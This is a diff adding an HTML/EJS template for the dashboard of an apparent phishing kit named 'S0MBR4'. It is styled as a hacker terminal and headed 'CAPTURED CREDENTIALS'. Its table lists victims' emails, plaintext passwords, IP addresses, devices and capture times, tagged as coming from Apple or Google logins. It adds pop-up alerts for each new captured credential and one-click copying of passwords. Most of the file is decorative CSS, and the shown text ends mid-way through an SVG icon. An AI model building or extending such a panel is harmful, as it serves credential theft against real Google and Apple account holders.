@@ -1,0 +1,1843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S0MBR4</title>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=VT323&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        body {
+            font-family: 'VT323', 'Courier New', monospace;
+            background-color: #06030d;
+            color: #e9d5ff;
+            min-height: 100vh;
+            padding: 44px 20px 60px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ---------- PARTICLE STORM (canvas) ---------- */
+        #storm {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        /* ambient pur¬ple glows : animated aurora */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 18% 8%, rgba(147, 51, 234, 0.28), transparent 52%),
+                radial-gradient(ellipse at 85% 90%, rgba(217, 70, 239, 0.18), transparent 55%),
+                radial-gradient(ellipse at 55% 45%, rgba(76, 29, 149, 0.22), transparent 65%);
+            pointer-events: none;
+            z-index: 0;
+            animation: bgBreath 7s ease-in-out infinite alternate;
+        }
+
+        @keyframes bgBreath {
+            0%   { opacity: 0.85; }
+            100% { opacity: 1; }
+        }
+
+        /* drifting conic aurora bands */
+        .aurora {
+            position: fixed;
+            inset: -20%;
+            pointer-events: none;
+            z-index: 1;
+            background:
+                conic-gradient(from 0deg,
+                    transparent 0deg,
+                    rgba(147, 51, 234, 0.10) 40deg,
+                    transparent 80deg,
+                    rgba(217, 70, 239, 0.12) 120deg,
+                    transparent 170deg,
+                    rgba(76, 29, 149, 0.14) 240deg,
+                    transparent 300deg);
+            filter: blur(30px);
+            animation: auroraSpin 24s linear infinite;
+        }
+
+        @keyframes auroraSpin {
+            from { transform: rotate(0deg); }
+            to   { transform: rotate(360deg); }
+        }
+
+        /* HUD legend badges that revolve around the viewport */
+        .hud-label {
+            position: fixed;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 8px;
+            letter-spacing: 2px;
+            color: rgba(168, 85, 247, 0.55);
+            text-transform: uppercase;
+            pointer-events: none;
+            z-index: 26;
+            animation: labelOrbit 26s linear infinite;
+        }
+
+        .hud-label::before {
+            content: '';
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            margin-right: 7px;
+            background: #a855f7;
+            box-shadow: 0 0 8px #a855f7;
+            animation: blink 0.9s steps(1) infinite;
+        }
+
+        @keyframes labelOrbit {
+            from { transform: translate(-50%, -50%) rotate(0) translateX(34vw); }
+            to   { transform: translate(-50%, -50%) rotate(360deg) translateX(34vw); }
+        }
+
+        #hud1 { top: 6%; left: 50%; }
+        #hud2 { top: 12%; right: 3%; animation-duration: 22s; animation-direction: reverse; }
+        #hud3 { bottom: 8%; left: 4%; animation-duration: 30s; }
+
+        /* modern slim scrollbar for the table panel */
+        .panel::-webkit-scrollbar {
+            height: 9px;
+        }
+
+        .panel::-webkit-scrollbar-thumb {
+            background: linear-gradient(90deg, #7c3aed, #d946ef);
+            border-radius: 5px;
+        }
+
+        .panel::-webkit-scrollbar-track {
+            background: rgba(124, 58, 237, 0.15);
+        }
+
+        /* CRT scanlines */
+        .scanlines {
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.22) 0px,
+                rgba(0, 0, 0, 0.22) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 30;
+        }
+
+        /* horizontal light sweep */
+        .sweep {
+            position: fixed;
+            left: 0;
+            right: 0;
+            height: 90px;
+            background: linear-gradient(180deg, transparent, rgba(168, 85, 247, 0.10), transparent);
+            pointer-events: none;
+            z-index: 29;
+            animation: sweepMove 7s linear infinite;
+        }
+
+        @keyframes sweepMove {
+            0%   { top: -15%; }
+            100% { top: 115%; }
+        }
+
+        /* vignette */
+        .vignette {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(ellipse at center, transparent 55%, rgba(2, 0, 8, 0.75) 100%);
+            pointer-events: none;
+            z-index: 31;
+        }
+
+        /* side waterfall rain canvases */
+        .rain {
+            position: fixed;
+            top: 0;
+            height: 100vh;
+            width: 230px;
+            pointer-events: none;
+            z-index: 5;
+            opacity: 0.85;
+        }
+
+        #rainLeft {
+            left: 0;
+        }
+
+        #rainRight {
+            right: 0;
+        }
+
+        @media (max-width: 1100px) {
+            .rain {
+                width: 130px;
+                opacity: 0.7;
+            }
+        }
+
+        @media (max-width: 760px) {
+            .rain {
+                display: none;
+            }
+        }
+
+        /* floating hexagons */
+        .hex {
+            position: fixed;
+            bottom: -90px;
+            clip-path: polygon(50% 0, 100% 25%, 100% 75%, 50% 100%, 0 75%, 0 25%);
+            background: linear-gradient(
+                135deg,
+                rgba(168, 85, 247, 0.85),
+                rgba(217, 70, 239, 0.55),
+                rgba(76, 29, 149, 0.75)
+            );
+            background-size: 200% 200%;
+            animation: hexRise linear infinite, hexHue 6s ease-in-out infinite alternate;
+            filter: blur(0.4px);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        @keyframes hexHue {
+            0%   { background-position: 0% 0%; }
+            100% { background-position: 100% 100%; }
+        }
+
+        @keyframes hexRise {
+            from { transform: translateY(0) rotate(0deg); }
+            to   { transform: translateY(-130vh) rotate(360deg); }
+        }
+
+        .container {
+            max-width: 920px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* ---------- LOGO ---------- */
+        .logo-wrap {
+            position: relative;
+            width: 132px;
+            height: 132px;
+            margin: 0 auto 26px;
+        }
+
+        .logo {
+            position: absolute;
+            inset: 14px;
+            width: 104px;
+            height: 104px;
+            image-rendering: pixelated;
+            animation: logoFloat 4s ease-in-out infinite, logoGlow 2.6s ease-in-out infinite;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50%      { transform: translateY(-14px); }
+        }
+
+        @keyframes logoGlow {
+            0%, 100% { filter: drop-shadow(0 0 6px rgba(168, 85, 247, 0.55)) drop-shadow(0 0 18px rgba(168, 85, 247, 0.25)); }
+            50%      { filter: drop-shadow(0 0 14px rgba(217, 70, 239, 0.95)) drop-shadow(0 0 42px rgba(217, 70, 239, 0.55)); }
+        }
+
+        .logo:hover {
+            animation: logoFloat 4s ease-in-out infinite, logoGlow 2.6s ease-in-out infinite, logoShake 0.55s ease-in-out infinite;
+        }
+
+        @keyframes logoShake {
+            0%, 100% { transform: translate(0, 0); }
+            25%      { transform: translate(-2px, 1px); }
+            50%      { transform: translate(2px, -1px); }
+            75%      { transform: translate(-1px, -2px); }
+        }
+
+        .logo-ring svg polygon {
+            stroke-dasharray: 1050;
+            stroke-dashoffset: 1050;
+            filter: drop-shadow(0 0 6px rgba(168, 85, 247, 0.9));
+            animation: ringDraw 3.4s ease-in-out infinite;
+        }
+
+        @keyframes ringDraw {
+            0%, 100% { stroke-dashoffset: 1050; }
+            45%      { stroke-dashoffset: 0; }
+        }
+
+        /* floating danger markers around the panel */
+        .bracket {
+            position: absolute;
+            pointer-events: none;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 12px;
+            color: rgba(217, 70, 239, 0.8);
+            text-shadow: 0 0 10px rgba(217, 70, 239, 0.7);
+            animation: bracketFloat 4.5s ease-in-out infinite;
+        }
+
+        @keyframes bracketFloat {
+            0%, 100% { transform: translateY(0); opacity: 0.5; }
+            50%      { transform: translateY(-8px); opacity: 1; }
+        }
+
+        .bracket.tl-outer { top: -26px; left: 10px; animation-delay: 0s; }
+        .bracket.tr-outer { top: -26px; right: 10px; animation-delay: 1.2s; }
+        .bracket.bl-outer { bottom: -26px; left: 10px; animation-delay: 2.3s; }
+        .bracket.br-outer { bottom: -26px; right: 10px; animation-delay: 3.1s; }
+
+        /* rotating hex ring around the logo */
+        .logo-ring {
+            position: absolute;
+            inset: 0;
+            animation: ringSpin 9s linear infinite;
+        }
+
+        .logo-ring svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 0 6px rgba(168, 85, 247, 0.8));
+        }
+
+        @keyframes ringSpin {
+            from { transform: rotate(0deg); }
+            to   { transform: rotate(360deg); }
+        }
+
+        /* scanning beam over the logo */
+        .logo-scan {
+            position: absolute;
+            left: 8px;
+            right: 8px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #d946ef, transparent);
+            box-shadow: 0 0 12px rgba(217, 70, 239, 0.9);
+            animation: logoSweep 2.2s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes logoSweep {
+            0%, 100% { top: 6%; opacity: 0; }
+            12%      { opacity: 1; }
+            88%      { opacity: 1; }
+            50%      { top: 92%; }
+        }
+
+        /* second beam, out of phase, over the ring */
+        .logo-ring {
+            position: absolute;
+            inset: 0;
+            animation: ringSpin 9s linear infinite;
+        }
+
+        .logo-ring::after {
+            content: '';
+            position: absolute;
+            inset: 6px;
+            border-radius: 50%;
+            border: 1px dashed rgba(217, 70, 239, 0.5);
+            animation: ringSpin 5s linear infinite reverse;
+        }
+
+        /* ---------- TITLE ---------- */
+        .title {
+            position: relative;
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 28px;
+            color: #c084fc;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 8px;
+            margin-bottom: 14px;
+            text-shadow: 0 0 12px rgba(192, 132, 252, 0.9), 0 0 42px rgba(168, 85, 247, 0.55);
+            animation: titleFlicker 5s infinite;
+        }
+
+        @keyframes titleFlicker {
+            0%, 100% { opacity: 1; }
+            92%      { opacity: 1; }
+            93%      { opacity: 0.55; }
+            94%      { opacity: 1; }
+            97%      { opacity: 0.75; }
+            98%      { opacity: 1; }
+        }
+
+        .title::before,
+        .title::after {
+            content: attr(data-text);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .title::before {
+            color: #22d3ee;
+            text-shadow: 0 0 10px rgba(34, 211, 238, 0.8);
+            animation: glitchTop 3.4s infinite linear alternate-reverse;
+            clip-path: inset(0 0 62% 0);
+        }
+
+        .title::after {
+            color: #f472b6;
+            text-shadow: 0 0 10px rgba(244, 114, 182, 0.8);
+            animation: glitchBottom 2.9s infinite linear alternate-reverse;
+            clip-path: inset(62% 0 0 0);
+        }
+
+        @keyframes glitchTop {
+            0%   { transform: translateX(0); }
+            10%  { transform: translateX(-3px); }
+            20%  { transform: translateX(2px); }
+            30%  { transform: translateX(-5px); }
+            40%  { transform: translateX(3px); }
+            50%  { transform: translateX(0); }
+            100% { transform: translateX(0); }
+        }
+
+        @keyframes glitchBottom {
+            0%   { transform: translateX(0); }
+            15%  { transform: translateX(4px); }
+            25%  { transform: translateX(-2px); }
+            35%  { transform: translateX(5px); }
+            45%  { transform: translateX(-3px); }
+            55%  { transform: translateX(0); }
+            100% { transform: translateX(0); }
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 17px;
+            color: #8b6fb5;
+            letter-spacing: 3px;
+            margin-bottom: 34px;
+            animation: flickerSoft 6s infinite;
+        }
+
+        @keyframes flickerSoft {
+            0%, 100% { opacity: 0.9; }
+            91%      { opacity: 0.9; }
+            92%      { opacity: 0.4; }
+            93%      { opacity: 0.9; }
+        }
+
+        /* ---------- TERMINAL LINE ---------- */
+        .terminal {
+            font-size: 19px;
+            color: #c4b5fd;
+            margin-bottom: 18px;
+            min-height: 24px;
+        }
+
+        .terminal .prompt {
+            color: #d946ef;
+        }
+
+        .cursor {
+            display: inline-block;
+            color: #a855f7;
+            animation: blink 0.9s steps(1) infinite;
+        }
+
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0; }
+        }
+
+        /* ---------- TABLE ---------- */
+        .panel {
+            position: relative;
+            background: rgba(18, 8, 36, 0.72);
+            border: 1px solid #7c3aed;
+            padding: 18px;
+            backdrop-filter: blur(2px);
+            animation: borderGlow 3.2s ease-in-out infinite;
+            overflow-x: auto;
+        }
+
+        @keyframes borderGlow {
+            0%, 100% { box-shadow: 0 0 16px rgba(124, 58, 237, 0.30), inset 0 0 28px rgba(124, 58, 237, 0.05); }
+            50%      { box-shadow: 0 0 34px rgba(168, 85, 247, 0.60), inset 0 0 42px rgba(168, 85, 247, 0.12); }
+        }
+
+        /* credentials section fades out after the last delete */
+        #credsSection {
+            transition: opacity 0.35s ease, transform 0.35s ease;
+        }
+
+        #credsSection.hide {
+            opacity: 0;
+            transform: translateY(-8px);
+        }
+
+        /* HUD corner brackets */
+        .corner {
+            position: absolute;
+            width: 22px;
+            height: 22px;
+            border: 2px solid #a855f7;
+            animation: cornerPulse 2.4s ease-in-out infinite;
+        }
+
+        .corner.tl { top: -2px; left: -2px; border-right: none; border-bottom: none; }
+        .corner.tr { top: -2px; right: -2px; border-left: none; border-bottom: none; }
+        .corner.bl { bottom: -2px; left: -2px; border-right: none; border-top: none; }
+        .corner.br { bottom: -2px; right: -2px; border-left: none; border-top: none; }
+
+        @keyframes cornerPulse {
+            0%, 100% { opacity: 0.55; }
+            50%      { opacity: 1; }
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th, td {
+            text-align: left;
+            padding: 12px 14px;
+            font-size: 19px;
+            border-bottom: 1px dashed rgba(124, 58, 237, 0.45);
+            vertical-align: middle;
+        }
+
+        th {
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 9px;
+            color: #a855f7;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            padding-bottom: 14px;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tbody tr {
+            animation: rowIn 0.55s ease-out both;
+            animation-delay: calc(var(--i) * 90ms);
+            transition: background 0.25s ease, text-shadow 0.25s ease;
+        }
+
+        /* specular energy coursing down the rows */
+        tbody tr td {
+            position: relative;
+        }
+
+        tbody tr td::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            right: 0;
+            height: 46%;
+            top: -50%;
+            background: linear-gradient(180deg, transparent, rgba(217, 70, 239, 0.20), transparent);
+            animation: rowSweep 4.6s ease-in-out infinite;
+            animation-delay: calc(var(--i) * 0.55s);
+            pointer-events: none;
+        }
+
+        @keyframes rowSweep {
+            0%   { top: -52%; }
+            60%, 100% { top: 130%; }
+        }
+
+        tbody tr.rowOut {
+            animation: none;
+            opacity: 0;
+            transform: translateX(26px);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        @keyframes rowIn {
+            from { opacity: 0; transform: translateX(-14px); }
+            to   { opacity: 1; transform: translateX(0); }
+        }
+
+        tbody tr:hover td {
+            background: rgba(124, 58, 237, 0.14);
+            text-shadow: 0 0 8px rgba(192, 132, 252, 0.6);
+        }
+
+        td.id {
+            color: #8b6fb5;
+        }
+
+        td.name {
+            color: #e9d5ff;
+        }
+
+        td.email {
+            color: #a78bfa;
+            word-break: break-all;
+        }
+
+        td.password {
+            color: #f472b6;
+            word-break: break-all;
+            text-shadow: 0 0 8px rgba(244, 114, 182, 0.35);
+        }
+
+        td.source {
+            white-space: nowrap;
+        }
+
+        .src-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 7px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            padding: 5px 8px;
+            border: 1px solid;
+        }
+
+        .src-badge svg {
+            width: 12px;
+            height: 12px;
+            flex-shrink: 0;
+        }
+
+        .src-badge.apple {
+            color: #f0abfc;
+            border-color: #a855f7;
+            background: rgba(168, 85, 247, 0.10);
+            text-shadow: 0 0 6px rgba(217, 70, 239, 0.5);
+        }
+
+        .src-badge.google {
+            color: #93c5fd;
+            border-color: #3b82f6;
+            background: rgba(59, 130, 246, 0.10);
+            text-shadow: 0 0 6px rgba(96, 165, 250, 0.5);
+        }
+
+        td.time {
+            color: #8b6fb5;
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 8px;
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+
+        td.ip {
+            color: #6ee7a0;
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 8px;
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+
+        td.device {
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 7px;
+            letter-spacing: 1px;
+            white-space: nowrap;
+            padding: 2px 8px;
+            border: 1px solid;
+            border-radius: 3px;
+            background: rgba(0, 0, 0, 0.35);
+        }
+
+        td.device.dev-pc {
+            color: #9aa0a6;
+            border-color: #5f6368;
+            text-shadow: 0 0 6px rgba(154, 160, 166, 0.4);
+        }
+
+        td.device.dev-phone {
+            color: #22d3ee;
+            border-color: #0891b2;
+            text-shadow: 0 0 6px rgba(34, 211, 238, 0.5);
+        }
+
+        td.device.dev-tablet {
+            color: #c084fc;
+            border-color: #9333ea;
+            text-shadow: 0 0 6px rgba(192, 132, 252, 0.5);
+        }
+
+        /* ogni casella copiabile (email, password, ip) */
+        td.copyable {
+            cursor: copy;
+            position: relative;
+            transition: background 0.15s ease;
+        }
+
+        td.copyable:hover {
+            background: rgba(124, 58, 237, 0.18);
+        }
+
+        td.copyable.copied {
+            background: rgba(34, 197, 94, 0.22) !important;
+            box-shadow: inset 0 0 0 1px #22c55e;
+        }
+
+        .copy-hint {
+            position: fixed;
+            bottom: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 950;
+            background: rgba(14, 5, 28, 0.92);
+            border: 1px solid #22c55e;
+            color: #4ade80;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 9px;
+            letter-spacing: 1px;
+            padding: 10px 16px;
+            box-shadow: 0 0 18px rgba(34, 197, 94, 0.5);
+            opacity: 0;
+            transform: translateX(-50%) translateY(10px);
+            transition: opacity 0.25s ease, transform 0.25s ease;
+            pointer-events: none;
+        }
+
+        .copy-hint.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* ---------- BOTTOM NAVIGATION BUTTONS (GOOGLE / APPLE login) ---------- */
+        .nav-buttons {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+
+        .nav-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 18px;
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 8px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            text-decoration: none;
+            border: 1px solid;
+            transition: transform 0.15s ease, box-shadow 0.15s ease, background 0.15s ease;
+        }
+
+        .nav-btn svg {
+            width: 16px;
+            height: 16px;
+            flex-shrink: 0;
+        }
+
+        .nav-btn.google {
+            color: #93c5fd;
+            border-color: #3b82f6;
+            background: rgba(59, 130, 246, 0.08);
+            text-shadow: 0 0 6px rgba(96, 165, 250, 0.5);
+        }
+
+        .nav-btn.google:hover {
+            background: rgba(59, 130, 246, 0.22);
+            box-shadow: 0 0 18px rgba(96, 165, 250, 0.65);
+            transform: translateY(-2px);
+        }
+
+        .nav-btn.apple {
+            color: #f0abfc;
+            border-color: #a855f7;
+            background: rgba(168, 85, 247, 0.08);
+            text-shadow: 0 0 6px rgba(217, 70, 239, 0.5);
+        }
+
+        .nav-btn.apple:hover {
+            background: rgba(168, 85, 247, 0.22);
+            box-shadow: 0 0 18px rgba(217, 70, 239, 0.65);
+            transform: translateY(-2px);
+        }
+
+        /* ---------- DELETE BUTTON ---------- */
+        .delete-form {
+            margin: 0;
+        }
+
+        .delete-btn {
+            background: transparent;
+            border: 1px solid #f472b6;
+            color: #f472b6;
+            cursor: pointer;
+            padding: 6px 8px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.2s ease;
+        }
+
+        .delete-btn svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .delete-btn:hover {
+            background: #f472b6;
+            color: #1a0610;
+            box-shadow: 0 0 14px rgba(244, 114, 182, 0.9);
+            animation: deleteBlink 0.35s steps(2) 2;
+        }
+
+        @keyframes deleteBlink {
+            0%   { opacity: 1; }
+            50%  { opacity: 0.35; }
+            100% { opacity: 1; }
+        }
+
+        /* ---------- EMPTY STATE ---------- */
+        .empty {
+            border: 1px dashed #7c3aed;
+            background: rgba(18, 8, 36, 0.6);
+            padding: 52px 20px;
+            text-align: center;
+            font-size: 20px;
+            color: #8b6fb5;
+            letter-spacing: 2px;
+            animation: emptyGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes emptyGlow {
+            0%, 100% { box-shadow: 0 0 14px rgba(124, 58, 237, 0.2); }
+            50%      { box-shadow: 0 0 30px rgba(168, 85, 247, 0.45); }
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 16px;
+            color: #54427a;
+            letter-spacing: 2px;
+        }
+
+        .footer-note .cursor {
+            font-size: 16px;
+        }
+
+        /* glitch frame around the whole page on hover of the logo */
+        .title {
+            user-select: none;
+        }
+
+        /* ---------- NEW CREDENTIAL ALERT TOAST ---------- */
+        .toast-wrap {
+            position: fixed;
+            top: 18px;
+            right: 18px;
+            z-index: 900;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            pointer-events: none;
+            max-width: min(340px, calc(100vw - 36px));
+        }
+
+        .toast {
+            position: relative;
+            background: rgba(14, 5, 28, 0.94);
+            border: 1px solid #a855f7;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 0 24px rgba(168, 85, 247, 0.55), inset 0 0 14px rgba(168, 85, 247, 0.18);
+            font-family: 'Press Start 2P', monospace;
+            font-size: 7px;
+            color: #e9d5ff;
+            letter-spacing: 1px;
+            transform: translateX(120%);
+            opacity: 0;
+            animation: toastIn 0.45s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        .toast.show {
+            animation: toastOut 0.5s ease forwards;
+        }
+
+        @keyframes toastIn {
+            from { transform: translateX(120%); opacity: 0; }
+            to   { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes toastOut {
+            from { transform: translateX(0); opacity: 1; }
+            to   { transform: translateX(120%); opacity: 0; }
+        }
+
+        .toast .toast-logo {
+            width: 30px;
+            height: 30px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+        }
+
+        .toast .toast-logo svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .toast .toast-logo.apple {
+            background: rgba(168, 85, 247, 0.16);
+            border: 1px solid #a855f7;
+            box-shadow: 0 0 14px rgba(217, 70, 239, 0.6);
+            animation: bizLogoPulse 1.6s ease-in-out infinite;
+        }
+
+        .toast .toast-logo.google {
+            background: rgba(59, 130, 246, 0.16);
+            border: 1px solid #3b82f6;
+            box-shadow: 0 0 14px rgba(96, 165, 250, 0.6);
+            animation: bizLogoPulse 1.6s ease-in-out infinite;
+        }
+
+        @keyframes bizLogoPulse {
+            0%, 100% { transform: translateY(0); }
+            50%      { transform: translateY(-3px); }
+        }
+
+        .toast-msg {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            min-width: 0;
+        }
+
+        .toast-msg .t-head {
+            color: #a855f7;
+            text-shadow: 0 0 8px rgba(168, 85, 247, 0.7);
+        }
+
+        .toast-msg .t-mail {
+            color: #22d3ee;
+            word-break: break-all;
+            text-shadow: 0 0 6px rgba(34, 211, 238, 0.5);
+        }
+
+        .toast-msg .t-row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .toast-msg .t-pw {
+            color: #f472b6;
+            word-break: break-all;
+            text-shadow: 0 0 6px rgba(244, 114, 182, 0.5);
+        }
+
+        .toast-msg .t-time {
+            color: #8b6fb5;
+        }
+
+        .toast-msg .t-date {
+            color: #6ee7a0;
+            font-size: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        /* close X */
+        .toast-close {
+            position: absolute;
+            top: 8px;
+            right: 10px;
+            background: none;
+            border: 1px solid rgba(168, 85, 247, 0.6);
+            color: #c4b5fd;
+            font-size: 12px;
+            line-height: 1;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border-radius: 3px;
+            font-family: 'Press Start 2P', monospace;
+            transition: background 0.15s ease, color 0.15s ease;
+        }
+
+        .toast-close:hover {
+            background: #f472b6;
+            border-color: #f472b6;
+            color: #1a0610;
+        }
+
+        /* green countdown timer bar that drains to zero, then auto-dismisses */
+        .toast-timer {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            height: 4px;
+            background: #22c55e;
+            box-shadow: 0 0 10px rgba(34, 197, 94, 0.7);
+            width: 100%;
+            transform-origin: left;
+            animation: timerDrain var(--tt) linear forwards;
+        }
+
+        @keyframes timerDrain {
+            from { transform: scaleX(1); }
+            to   { transform: scaleX(0); }
+        }
+
+        .toast {
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ---------- SOUND TOGGLE ---------- */
+        .sound-toggle {
+            position: fixed;
+            top: 14px;
+            left: 16px;
+            z-index: 940;
+            background: rgba(14, 5, 28, 0.8);
+            border: 1px solid #7c3aed;
+            color: #c084fc;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 9px;
+            letter-spacing: 1px;
+            padding: 8px 12px;
+            cursor: pointer;
+            box-shadow: 0 0 12px rgba(124, 58, 237, 0.4);
+            transition: background 0.15s ease, color 0.15s ease;
+        }
+
+        .sound-toggle:hover {
+            background: #7c3aed;
+            color: #fff;
+        }
+
+        .sound-toggle.muted {
+            color: #6b7280;
+            border-color: #4b5563;
+            box-shadow: none;
+        }
+
+        .sound-toggle.muted:hover {
+            background: transparent;
+            color: #c084fc;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="rainLeft" class="rain"></canvas>
+    <canvas id="rainRight" class="rain"></canvas>
+    <canvas id="storm"></canvas>
+    <div id="hexBg"></div>
+    <div class="aurora"></div>
+    <div class="scanlines"></div>
+    <div class="sweep"></div>
+    <div class="vignette"></div>
+
+    <span class="hud-label" id="hud1">UPLINK: STABLE</span>
+    <span class="hud-label" id="hud2">// NODE 7 //</span>
+    <span class="hud-label" id="hud3">DATA BREACH IN PROGRESS</span>
+
+    <button type="button" class="sound-toggle" id="soundToggle" title="Toggle sound">♫ SND ON</button>
+    <div class="toast-wrap" id="toast-wrap"></div>
+    <div class="copy-hint" id="copyHint"></div>
+
+    <main class="container">
+        <div class="logo-wrap">
+            <div class="logo-ring">
+                <svg viewBox="0 0 100 100" fill="none" stroke="#a855f7" stroke-width="2">
+                    <polygon points="50,3 90,26 90,74 50,97 10,74 10,26"/>
+                </svg>
+            </div>
+            <img src="/images/skull.png" alt="S0MBR4" class="logo" id="logo">
+            <div class="logo-scan"></div>
+        </div>
+
+        <h1 class="title" data-text="S0MBR4">S0MBR4</h1>
+        <p class="subtitle">// CAPTURED CREDENTIALS // ACCESS GRANTED //</p>
+
+        <div class="empty <%= users.length > 0 ? 'hidden' : '' %>" id="emptyState">
+            &gt; NO CREDENTIALS CAPTURED YET<span class="cursor">&nbsp;▮</span>
+        </div>
+
+        <section id="credsSection" class="<%= users.length === 0 ? 'hidden' : '' %>">
+            <div class="terminal">
+                <span class="prompt">&gt;</span> <span id="typing"></span><span class="cursor">▮</span>
+            </div>
+
+            <div class="panel">
+                <div class="corner tl"></div>
+                <div class="corner tr"></div>
+                <div class="corner bl"></div>
+                <div class="corner br"></div>
+                <span class="bracket tl-outer">&#123;</span>
+                <span class="bracket tr-outer">&#125;</span>
+                <span class="bracket bl-outer">&#10100;</span>
+                <span class="bracket br-outer">&#10101;</span>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Source</th>
+                            <th>Email</th>
+                            <th>Password</th>
+                            <th>IP</th>
+                            <th>DEV</th>
+                            <th>Time</th>
+                            <th></th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <% users.forEach(function(user, i) { %>
+                            <tr style="--i:<%= i %>">
+                                <td class="id"><%= user.id %></td>
+                                <td class="source">
+                                    <% if (user.source === 'apple') { %>
+                                        <span class="src-badge apple">
+                                            <svg viewBox="0 0 24 24" fill="#ffffff" aria-hidden="true"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.03 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.56-1.702z"/></svg>
+                                            APPLE
+                                        </span>
+                                    <% } else { %>
+                                        <span class="src-badge google">
+                                            <svg viewBox="0 0 48 48" aria-hidden="true">
+                                                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                                                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
